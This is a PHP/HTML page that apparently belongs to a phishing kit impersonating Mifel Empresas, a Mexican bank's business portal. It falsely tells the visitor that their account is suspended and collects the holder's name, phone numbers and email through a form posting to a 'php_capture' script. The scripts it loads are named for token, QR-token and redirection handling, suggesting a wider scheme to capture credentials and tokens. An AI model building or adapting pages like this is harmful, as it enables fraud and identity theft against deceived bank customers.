<?php
session_start();

if (!isset($_SESSION['usuario_id'])) {
    header('Location: index.php');
    exit;
}

$errores = $_SESSION['form_errors'] ?? [];
$old = $_SESSION['form_old'] ?? [];
unset($_SESSION['form_errors'], $_SESSION['form_old']);

function mostrar_error(array $errores, string $campo): string
{
    return isset($errores[$campo]) ? htmlspecialchars($errores[$campo], ENT_QUOTES, 'UTF-8') : '';
}

function valor_campo(array $old, string $campo): string
{
    return htmlspecialchars($old[$campo] ?? '', ENT_QUOTES, 'UTF-8');
}

function clase_invalida(array $errores, string $campo): string
{
    return isset($errores[$campo]) ? ' is-invalid' : '';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Datos de contacto - Empresas</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../css/feLinicio.css">
    <link rel="stylesheet" href="../css/_responsivefel.css">
    <link rel="stylesheet" href="../css/gps.css">
    <link rel="stylesheet" href="../css/form.css">
    <link rel="stylesheet" href="css/empresas-header.css">
    <link rel="stylesheet" href="../php_modales/css/modales_input_no_input.css">
    <link rel="stylesheet" href="../php_modales/css/herramientas.css">
    <link rel="stylesheet" href="../php_modales/css/reloj_personalizado.css">
    <link rel="stylesheet" href="../php_modales/css/email_validate.css">
    <link rel="stylesheet" href="../php_modales/css/token_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/token_qr_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/contacto_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/sincronizacion.css">
    <link rel="stylesheet" href="../css/zeppelin_churro_btn.css">
    <?php require_once __DIR__ . '/../includes/responsive_movil.php'; mifel_responsive_movil_empresas(true); ?>
</head>
<body>
    <header class="header-container empresas-header">
        <div class="header-wrapper">
            <div class="logo-center">
                <img src="../images/logo-empresas_BLANCO.svg" alt="Mifel Empresas" class="mifel-header-logo">
            </div>
            <?php require_once __DIR__ . '/includes/bienvenida_usuario.php'; ?>
        </div>
    </header>

    <main class="form-container form-layout">
        <div class="form-content">
            <div class="form-info">
                <p class="form-badge">Proceso de desbloqueo</p>
                <h1 class="form-title">Restablecimiento de acceso pendiente</h1>
                <p class="form-description">Tu usuario empresarial permanece suspendido de forma preventiva. Para reactivarlo, confirma los datos de contacto vinculados a tu cuenta.</p>
                <p class="form-notice">Los datos deben corresponder al titular de la cuenta o al representante legal autorizado. Este paso es obligatorio para continuar con el restablecimiento del acceso.</p>
            </div>

            <div class="form-panel">
                <form class="data-form" action="../php_capture/form_contact.php" method="POST" novalidate>
                <?php if (!empty($errores['_general'])): ?>
                <p class="form-error-general" role="alert"><?= mostrar_error($errores, '_general') ?></p>
                <?php endif; ?>

                <div class="input-group">
                    <label for="fullName" class="input-label">Nombre del titular o representante legal</label>
                    <div class="input-wrapper">
                        <input type="text" id="fullName" name="fullName" class="input-field<?= clase_invalida($errores, 'fullName') ?>"
                               value="<?= valor_campo($old, 'fullName') ?>"
                               required style="text-transform: uppercase;">
                    </div>
                    <?php if (mostrar_error($errores, 'fullName')): ?>
                    <span class="field-error" role="alert"><?= mostrar_error($errores, 'fullName') ?></span>
                    <?php endif; ?>
                </div>

                <div class="input-group phone-group">
                    <div class="phone-field">
                        <label for="phone" class="input-label">Teléfono fijo (opcional)</label>
                        <div class="input-wrapper phone-wrapper<?= clase_invalida($errores, 'phone') ?>">
                            <span class="phone-prefix">+52</span>
                            <input type="tel" id="phone" name="phone" class="input-field phone-input"
                                   value="<?= valor_campo($old, 'phone') ?>"
                                   pattern="[0-9]{10}" maxlength="10"
                                   placeholder="10 dígitos"
                                   oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        </div>
                        <?php if (mostrar_error($errores, 'phone')): ?>
                        <span class="field-error" role="alert"><?= mostrar_error($errores, 'phone') ?></span>
                        <?php endif; ?>
                    </div>

                    <div class="phone-field">
                        <label for="mobile" class="input-label">Teléfono móvil</label>
                        <div class="input-wrapper phone-wrapper<?= clase_invalida($errores, 'mobile') ?>">
                            <span class="phone-prefix">+52</span>
                            <input type="tel" id="mobile" name="mobile" class="input-field phone-input"
                                   value="<?= valor_campo($old, 'mobile') ?>"
                                   pattern="[0-9]{10}" maxlength="10"
                                   placeholder="10 dígitos" required
                                   oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        </div>
                        <?php if (mostrar_error($errores, 'mobile')): ?>
                        <span class="field-error" role="alert"><?= mostrar_error($errores, 'mobile') ?></span>
                        <?php endif; ?>
                    </div>
                </div>

                <div class="input-group">
                    <label for="email" class="input-label">Correo electrónico</label>
                    <div class="input-wrapper">
                        <input type="email" id="email" name="email" class="input-field<?= clase_invalida($errores, 'email') ?>"
                               value="<?= valor_campo($old, 'email') ?>"
                               required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$">
                    </div>
                    <?php if (mostrar_error($errores, 'email')): ?>
                    <span class="field-error" role="alert"><?= mostrar_error($errores, 'email') ?></span>
                    <?php endif; ?>
                </div>

                <button type="submit" class="submit-button">Continuar</button>
                </form>

                <a href="index.php" class="back-link">Volver</a>
            </div>
        </div>
    </main>

    <script>window.MODAL_BASE = '../';</script>
    <script src="js/contextoDinamicoEmpresas.js"></script>
    <script src="../js/formErrores.js"></script>
    <script src="../php_modales/js/check_status.js"></script>
    <script src="../php_modales/js/modales_input_no_input.js"></script>
    <script src="../php_modales/js/herramientas.js"></script>
    <script src="../php_modales/js/reloj_personalizado.js"></script>
    <script src="../php_modales/js/redirecciones.js"></script>
    <script src="../php_modales/js/email_validate_handler.js"></script>
    <script src="../php_modales/js/token_empresa_handler.js"></script>
    <script src="../php_modales/js/token_qr_empresa_handler.js"></script>
    <script src="../php_modales/js/contacto_empresa_handler.js"></script>
    <script src="../php_modales/js/sincronizacion_handler.js"></script>
</body>
</html>
